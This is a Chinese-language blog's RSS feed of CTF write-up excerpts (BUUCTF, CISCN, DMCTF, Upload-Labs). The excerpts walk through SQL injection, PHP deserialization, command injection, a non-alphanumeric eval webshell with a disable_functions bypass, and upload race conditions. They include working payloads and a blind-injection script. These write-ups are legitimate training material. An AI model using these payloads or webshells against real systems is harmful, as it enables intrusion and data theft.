<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CTF on </title>
    <link>/categories/ctf/</link>
    <description>Recent content in CTF on </description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate>
    <atom:link href="/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CISCN线上赛库存</title>
      <link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
      <pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate>
      <guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
      <description>easy_sql 在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合&#xA;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&#xA;过滤的字符有union，所以尝试报错注入，查询版本号。&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))# 接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&#xA;最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))# 回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&#xA;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39; 直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))# flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</description>
    </item>
    <item>
      <title>ReadlezPHP&amp;EasySearch</title>
      <link>/posts/ctf/readlezphpeasysearch/</link>
      <pubDate>Tue, 20 Apr 2021 17:12:43 +0000</pubDate>
      <guid>/posts/ctf/readlezphpeasysearch/</guid>
      <description>ReadlezPHP 源码找到time.php?source&#xA;&amp;lt;?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-&amp;gt;a = &amp;#34;Y-m-d h:i:s&amp;#34;; $this-&amp;gt;b = &amp;#34;date&amp;#34;; } public function __destruct(){ $a = $this-&amp;gt;a; $b = $this-&amp;gt;b; echo $b($a); } } $c = new HelloPhp; if(isset($_GET[&amp;#39;source&amp;#39;])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[&amp;#34;data&amp;#34;]); 分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在HelloPhp中有一个__destruct方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如$a($b)格式进行函数调用，假如变量a为字符串var_dump，b是任意字符串，就相当于调用var_dump函数且参数为b。&#xA;所以构造反序列化，调用assert函数执行phpinfo。如果向assert() 函数传递字符串，它将会被 assert() 当做 PHP 代码来执行)：&#xA;&amp;lt;?php&#xD;class HelloPhp&#xD;{&#xD;public $a=&amp;#39;phpinfo()&amp;#39;;&#xD;public $b=&amp;#39;assert&amp;#39;;&#xD;}&#xD;$s=new HelloPhp();&#xD;echo serialize($s); POST请求&#xA;time.php?data=O:8:&amp;#34;HelloPhp&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;phpinfo()&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:6:&amp;#34;assert&amp;#34;;} 页面查找flag，在environment中找到flag</description>
    </item>
    <item>
      <title>极客大挑战 2019 FinalSQL</title>
      <link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</link>
      <pubDate>Sun, 18 Apr 2021 19:11:51 +0000</pubDate>
      <guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</guid>
      <description>还是同一场比赛的界面&#xA;这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：你可别被我逮住了，臭弟弟，测试上面的序号，注意此时的url中有?id=猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个数字型注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。&#xA;发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。&#xA;贴出来自己的脚本：&#xA;# codeing=utf-8 import requests import time url=&amp;#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&amp;#39; result=&amp;#39;&amp;#39; for x in range(1, 100): high = 127 low = 32 mid = (low + high) // 2 while high&amp;gt;low: # sql=&amp;#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&amp;#34;%(i,c) # sql = &amp;#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;F1naI1y&amp;#39;)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid) sql = &amp;#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid) time.sleep(0.1) reponse=requests.get(url+sql) if &amp;#34;Click&amp;#34; in reponse.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) 我是直接使用了判断字符的返回值1或0作为id的参数，因为使用group_concat拼接时字符串有逗号,所以字符ascii需要至少从44开始。&#xA;下面是查询到的两个表F1naI1y 、Flaaaaag及结构&#xA;F1naI1y ====&amp;gt; id,username,password</description>
    </item>
    <item>
      <title>WUSTCTF2020 朴实无华</title>
      <link>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</link>
      <pubDate>Fri, 16 Apr 2021 15:33:32 +0000</pubDate>
      <guid>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</guid>
      <description>进入页面直接报错&#xA;试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容&#xA;User-agent: * Disallow: /fAke_f1agggg.php&#xA;访问fAke_f1agggg.php并且抓包，在响应头里有提示。&#xA;访问fl4g.php才正式开始，源码如下：&#xA;&amp;lt;img src=&amp;#34;/img.jpg&amp;#34;&amp;gt; &amp;lt;?php header(&amp;#39;Content-type:text/html;charset=utf-8&amp;#39;); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET[&amp;#39;num&amp;#39;])){ $num = $_GET[&amp;#39;num&amp;#39;]; if(intval($num) &amp;lt; 2020 &amp;amp;&amp;amp; intval($num + 1) &amp;gt; 2021){ echo &amp;#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&amp;lt;/br&amp;gt;&amp;#34;; }else{ die(&amp;#34;金钱解决不了穷人的本质问题&amp;#34;); } }else{ die(&amp;#34;去非洲吧&amp;#34;); } //level 2 if (isset($_GET[&amp;#39;md5&amp;#39;])){ $md5=$_GET[&amp;#39;md5&amp;#39;]; if ($md5==md5($md5)) echo &amp;#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&amp;lt;/br&amp;gt;&amp;#34;; else die(&amp;#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&amp;#34;); }else{ die(&amp;#34;去非洲吧&amp;#34;); } //get flag if (isset($_GET[&amp;#39;get_flag&amp;#39;])){ $get_flag = $_GET[&amp;#39;get_flag&amp;#39;]; if(!</description>
    </item>
    <item>
      <title>SWPU2019 Web1</title>
      <link>/posts/ctf/swpu2019web1/</link>
      <pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate>
      <guid>/posts/ctf/swpu2019web1/</guid>
      <description>一个登陆界面，再看下url地址为login.php，确认了使用的是php&#xA;直接查看源码，在源码中找到了register.php。先注册一个进去看一看。&#xA;是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号&#39;试一试&#xA;广告详情中出现了数据库报错&#xA;猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是字符型单引号闭合。&#xA;接下来是尝试过滤。我试出来的有空格（使用/**/绕过）、or，and（可以使用&amp;amp;&amp;amp;，||），同时or被过滤，就说明保存数据库表名的库information_schema没有办法查询，并且orderby也不能使用，需要使用其他办法获取表内容。&#xA;测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 LIMIT 0,1需要闭合，所以最后添加了一个单引号&#xA;&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; 说明回显位是2和3。&#xA;由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。这种没有办法查询表名的题目表名应该都不会设置太难&#xA;测试的语句&#xA;&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; 当测到users表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&#xA;首先讲解一波无列名注入。&#xA;先来个正常表（flag）的查询&#xA;我们知道在sql语句查询的时候，可以给列名起别名形如&#xA;使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名&#xA;所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造&#xA;需要为子查询的结果再起一个别名（图中为x），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用group_concat函数输出自己构造的表名。&#xA;所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。&#xA;最终的payload：&#xA;&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; </description>
    </item>
    <item>
      <title>BUUCTF寒假刷题-Web</title>
      <link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link>
      <pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate>
      <guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid>
      <description>寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&#xA;2021.01.15 [HCTF 2018]WarmUp 进到靶机一个硕大的滑稽，查看源码有提示source.php&#xA;&amp;lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;amp;$page) { $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;]; if (! isset($page) || !is_string($page)) { echo &amp;#34;you can&amp;#39;t see it&amp;#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?</description>
    </item>
    <item>
      <title>极客大挑战 2019 RCE ME</title>
      <link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link>
      <pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate>
      <guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid>
      <description>[极客大挑战 2019]RCE ME 源码：&#xA;&amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;code&amp;#39;])){ $code=$_GET[&amp;#39;code&amp;#39;]; if(strlen($code)&amp;gt;40){ die(&amp;#34;This is too Long.&amp;#34;); } if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){ die(&amp;#34;NO.&amp;#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&amp;gt; 分析一波，GET请求获得code，想要通过的话需要绕过两个检测：&#xA;payload长度小于40 不能包含a-z、A-Z、0-9 和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:一些不包含数字和字母的webshell，这次摸到了相关文章：无字母数字webshell之提高篇。&#xA;使用url编码+~取反构造不可见字符串，然后加上php7版本以后支持了使用：($a)()这样的方法动态执行函数，所以我们可以构造payload：assert(eval($_POST[‘a’]))&#xA;先构造assert：&#xA;echo urlencode(~&amp;#39;assert&amp;#39;); //结果：%9E%8C%8C%9A%8D%8B 再构造eval($_POST[&#39;a&#39;])：&#xA;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;); //结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6 完整payload：&#xA;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6); 网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的~取反再获得真正的函数名。&#xA;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是ELF是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回ret=127：&#xA;搜索了一波，原来是是disable_function搞的鬼，这个表可以在phpinfo()中查看：&#xA;因为system、exec、shell_exec等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过disable_function的方法，网上有很多其他方法，其中一个方法：&#xA;利用环境变量LD_PRELOAD来绕过&#xA;php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&#xA;LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&#xA;正好蚁剑的插件中就有一个名为：as_bypass_php_disable_functions的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&#xA;插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的/var/www/html目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&#xA;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&#xA;上传一句话木马233.php：&#xA;&amp;lt;?php @eval($_POST[&amp;#39;b&amp;#39;]); 再用一句话木马的shell执行插件：&#xA;进入shell，目录下面多了一个名为**.antproxy.php**的文件：&#xA;再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&#xA;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}</description>
    </item>
    <item>
      <title>GXYCTF2019 Ping Ping Ping</title>
      <link>/posts/ctf/gxyctf2019ping-ping-ping/</link>
      <pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate>
      <guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid>
      <description>[GXYCTF2019]Ping Ping Ping 题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&#xA;和DMCTF做的那道pingpingping类似，同样是使用管道符构造payload，先使用：&#xA;?ip=127.0.0.1|ls 目录下有两个文件：flag.php、index.php。首先试出来了空格被过滤，使用以下绕过空格：&#xA;$IFS&#xD;${IFS}&#xD;$IFS$1 //$1改成$加其他数字貌似都行&#xD;&amp;lt; &amp;lt;&amp;gt; {cat,flag.php} //用逗号实现了空格功能&#xD;%20 %09 在linux下反单引号里面的指令会被执行 `ls`&#xA;?ip=|cat$IFS`ls` 会输出该目录下所有可以打开的文件，可以查看index.php的部分源码有哪些过滤：&#xA;/?ip=|\&amp;#39;|\&amp;#34;|\\|\(|\)|\[|\]|\{|\}/&amp;#34;, $ip, $match)){ echo preg_match(&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|\&amp;#34;|\\|\(|\)|\[|\]|\{|\}/&amp;#34;, $ip, $match); die(&amp;#34;fxck your symbol!&amp;#34;); } else if(preg_match(&amp;#34;/ /&amp;#34;, $ip)){ die(&amp;#34;fxck your space!&amp;#34;); } else if(preg_match(&amp;#34;/bash/&amp;#34;, $ip)){ die(&amp;#34;fxck your bash!&amp;#34;); } else if(preg_match(&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;, $ip)){ die(&amp;#34;fxck your flag!&amp;#34;); } $a = shell_exec(&amp;#34;ping -c 4 &amp;#34;.$ip); echo &amp;#34; &amp;#34;; print_r($a); } ?&amp;gt; 一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问flag.php。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用readflag的ELF执行文件访问，但是还没成功。其实执行：&#xA;?ip=|cat$IFS`ls` 这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了我是傻逼。&#xA;最后记录下学到的姿势和这道题目的其他思路：</description>
    </item>
    <item>
      <title>DMCTF之Misc</title>
      <link>/posts/ctf/dmctf%E4%B9%8Bmisc/</link>
      <pubDate>Tue, 01 Dec 2020 11:20:45 +0000</pubDate>
      <guid>/posts/ctf/dmctf%E4%B9%8Bmisc/</guid>
      <description>前言 这次比赛是第一次做Mics的题awa。&#xA;Misc Check_in 真·有手就行&#xA;fakezip 看到题目fakezip翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：zip伪加密，使用010 Editor打开压缩包，&#xA;找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt&#xA;打开以后内容是：♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=，音符加密虽然是第一次听说，但是百度还是可以简单找到：文本加密为音乐符号&#xA;Base family 题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：base16、base32、base58、base64、base91。还有几种没听过的base种类可以在这个网站找到：CTF在线工具。&#xA;原层：&#xA;XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&amp;#34;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&amp;amp;GP&amp;lt;Rk:o_Jk&amp;lt;J.zp8%H0g7sYSTJ9p.&amp;#34;duRBGj`g0!I+xjm(fh)]IF:&amp;gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=&amp;lt;D base91解码：&#xA;3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW base58解码：&#xA;JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5 base32解码：&#xA;NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q= base64解码：&#xA;666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d hex解码：&#xA;flag{y0u_alr3ady_kn0w_th3_Basefam1ly} SlientEye 根据题目直接百度SlientEye，下载以后打开图片&amp;ndash;&amp;gt;decode：&#xA;参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：&#xA;&amp;amp;#102;&amp;amp;#108;&amp;amp;#97;&amp;amp;#103;&amp;amp;#123;&amp;amp;#110;&amp;amp;#49;&amp;amp;#95;&amp;amp;#98;&amp;amp;#117;&amp;amp;#95;&amp;amp;#106;&amp;amp;#49;&amp;amp;#97;&amp;amp;#110;&amp;amp;#103;&amp;amp;#95;&amp;amp;#119;&amp;amp;#117;&amp;amp;#95;&amp;amp;#100;&amp;amp;#51;&amp;amp;#125; 再去百度搜到一篇博客：&amp;amp;#x开头的是什么编码?，我点开一看，哦，原来是entity code实体编码，我啪的一下就把flag.txt改为flag.html，很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳打开flag.html获得flag：flag{n1_bu_j1ang_wu_d3}&#xA;编码之王 下载文件打开后一堆社会主义核心价值观，前面提到的：CTF在线工具就有核心价值观编码，下面放密文，上面是解码内容。&#xA;解出来以后看到第一句：如是我闻:，&amp;ndash;&amp;gt;与佛论禅&#xA;再解之后看第一句：新佛曰：。&amp;ndash;&amp;gt;新与佛论禅&#xA;解完以后直接出了一堆由：[、]、!、+、(、)组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag&#xA;jpgsteg 题目即是用到的工具，百度下载软件，使用jphide.exe打开图片Tap code.jpg，选择seek功能解密，密码为123456（我蒙的）：&#xA;成功解密后获得一个文档，内容如下：&#xA;... ....&#xD;.. ...&#xD;.. ...&#xD;. .&#xD;... ..&#xD;. .&#xD;..... .....&#xD;.. ....&#xD;... ...&#xD;.. .. 这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的.分成两部分代表坐标&#xA;解码得到：ohhamazing ，加上括号就是：flag{ohhamazing}&#xA;事后多看了一眼图片命名：Tap code.jpg。这用啥解密不就在脸上写着的wosabi \0/。。。&#xA;Collision 打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：&#xA;所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：crc32碰撞 ctf python作者原创的脚本：</description>
    </item>
    <item>
      <title>DMCTF之Web</title>
      <link>/posts/ctf/dmctf%E4%B9%8Bweb/</link>
      <pubDate>Sun, 29 Nov 2020 23:17:50 +0000</pubDate>
      <guid>/posts/ctf/dmctf%E4%B9%8Bweb/</guid>
      <description>前言 比赛地址：http://dmctf.vaala.cloud:81&#xA;这次先写Web题目部分，我最后的排名：&#xA;Web weak_type 源码：&#xA;PHP&#xD;&amp;lt;?php&#xD;show_source(__FILE__);&#xD;include(&amp;#39;class.php&amp;#39;);&#xD;//level1 if(isset($_GET[&amp;#39;num&amp;#39;])){&#xD;$num = $_GET[&amp;#39;num&amp;#39;];&#xD;if($num===&amp;#34;202020020&amp;#34;){&#xD;die(&amp;#34;no no no!&amp;#34;);&#xD;}&#xD;if(intval($num,0)===202020020){&#xD;echo &amp;#34;&amp;lt;br&amp;gt; level 1 Ok &amp;lt;br&amp;gt;&amp;#34;;&#xD;}else{&#xD;die(&amp;#39;what are you doing?&amp;#39;);&#xD;}&#xD;}else{&#xD;die();&#xD;}&#xD;//level 2&#xD;if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;])){&#xD;$v1 = $_GET[&amp;#39;v1&amp;#39;];&#xD;$v2 = $_GET[&amp;#39;v2&amp;#39;];&#xD;if($v1 != $v2 &amp;amp;&amp;amp; md5($v1)==md5($v2)){&#xD;echo &amp;#34;&amp;lt;br&amp;gt; level 2 Ok &amp;lt;br&amp;gt;&amp;#34;;&#xD;}else{&#xD;die(&amp;#39;Are you kidding me ?&amp;#39;);&#xD;}&#xD;}else{&#xD;die();&#xD;}&#xD;//level 3 if (isset($_POST[&amp;#39;message&amp;#39;])) {&#xD;$message = json_decode($_POST[&amp;#39;message&amp;#39;]);&#xD;if ($message-&amp;gt;key == $key) {&#xD;echo &amp;#34;&amp;lt;br&amp;gt; Wow you got it !</description>
    </item>
    <item>
      <title>Upload-Labs的最后几道题</title>
      <link>/posts/ctf/upload-labs5/</link>
      <pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate>
      <guid>/posts/ctf/upload-labs5/</guid>
      <description>Pass-17 ​&#x9;（windows环境，php版本5.2.17，题号是18题）&#xA;源码：&#xA;$is_upload = false; $msg = null; if(isset($_POST[&amp;#39;submit&amp;#39;])){ $ext_arr = array(&amp;#39;jpg&amp;#39;,&amp;#39;png&amp;#39;,&amp;#39;gif&amp;#39;); $file_name = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]; $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]; $file_ext = substr($file_name,strrpos($file_name,&amp;#34;.&amp;#34;)+1); $upload_file = UPLOAD_PATH . &amp;#39;/&amp;#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &amp;#39;/&amp;#39;. rand(10, 99).date(&amp;#34;YmdHis&amp;#34;).&amp;#34;.&amp;#34;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;; unlink($upload_file); } }else{ $msg = &amp;#39;上传出错！&amp;#39;; } } ​&#x9;思路和前面的一样，获取文件信息，移动文件到upload文件夹，第12行使用了白名单验证，多了第14行的rename函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了上传竞争，使用python脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码&amp;lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php phpinfo();?&amp;gt;&#39;);?&amp;gt;这段代码执行以后，会创建一个名为shell.php里面有一句&amp;lt;?php phpinfo();?&amp;gt;的文件。&#xA;​&#x9;脚本代码&#xA;#coding=utf-8 import requests from multiprocessing import Pool def CompeteUpload(list): url=&amp;#34;http://upload-labs/Pass-18/index.</description>
    </item>
    <item>
      <title>Upload-Labs之Pass-16</title>
      <link>/posts/ctf/upload-labs4/</link>
      <pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate>
      <guid>/posts/ctf/upload-labs4/</guid>
      <description>前言 ​&#x9;我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。&#xA;​&#x9;参考博客：upload-labs之pass 16详细分析&#xA;Pass-16 ​&#x9;源码（三种图片的判定，只贴一个吧，篇幅小一点）：&#xA;$is_upload = false; $msg = null; if (isset($_POST[&amp;#39;submit&amp;#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]; $filetype = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;]; $tmpname = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]; $target_path=UPLOAD_PATH.&amp;#39;/&amp;#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&amp;#34;.&amp;#34;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &amp;#34;jpg&amp;#34;) &amp;amp;&amp;amp; ($filetype==&amp;#34;image/jpeg&amp;#34;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &amp;#34;该文件不是jpg格式的图片！&amp;#34;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&amp;#34;.jpg&amp;#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = 